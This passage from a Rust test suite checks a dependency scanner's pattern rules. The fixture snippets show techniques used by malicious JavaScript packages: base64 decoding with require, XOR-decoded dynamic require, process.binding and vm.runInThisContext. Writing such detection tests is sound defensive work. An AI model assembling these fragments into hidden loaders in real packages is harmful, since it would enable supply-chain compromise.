            "Expected P002 cross-line finding for Buffer.from + require in same file"
        );
    }

    #[test]
    fn test_no_cross_line_without_decode() {
        let (dir, config) = setup_dep_file("var t = require('fs');");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        let p002: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.rule_id == "DEPSEC-P002")
            .collect();
        assert!(
            p002.is_empty(),
            "No base64 decode = no P002 cross-line finding"
        );
    }

    // --- Signal combination tests ---

    #[test]
    fn test_signal_combination_escalates() {
        // File with dynamic require + deobfuscation = P013 should escalate to Critical
        let (dir, config) =
            setup_dep_file("var c = String.fromCharCode(x ^ 42);\nvar m = require(decoded);");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        let p013: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.rule_id == "DEPSEC-P013")
            .collect();
        assert!(!p013.is_empty(), "Expected P013 finding");
        assert!(
            p013.iter().any(|f| f.message.contains("ESCALATED")),
            "P013 should be escalated when combined with P014 obfuscation signal"
        );
    }

    #[test]
    fn test_signal_single_no_escalation() {
        // File with only dynamic require — should NOT escalate
        let (dir, config) = setup_dep_file("var m = require(computedName);");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        let p013: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.rule_id == "DEPSEC-P013")
            .collect();
        assert!(!p013.is_empty(), "Expected P013 finding");
        assert!(
            !p013.iter().any(|f| f.message.contains("ESCALATED")),
            "Single signal should NOT be escalated"
        );
    }

    // --- P018: Node Internal Binding tests ---

    #[test]
    fn test_scan_detects_process_binding() {
        let (dir, config) = setup_dep_file("const fs = process.binding('fs');");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P018"),
            "Expected P018 finding for process.binding()"
        );
    }

    // --- P019: VM Code Execution tests ---

    #[test]
    fn test_scan_detects_vm_run() {
        let (dir, config) = setup_dep_file("const vm = require('vm');\nvm.runInThisContext(code);");
        let ctx = ScanContext {
            root: dir.path(),
            config: &config,
        };
        let result = PatternsCheck.run(&ctx).unwrap();
        assert!(
            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P019"),
            "Expected P019 finding for vm.runInThisContext()"
        );
    }
}
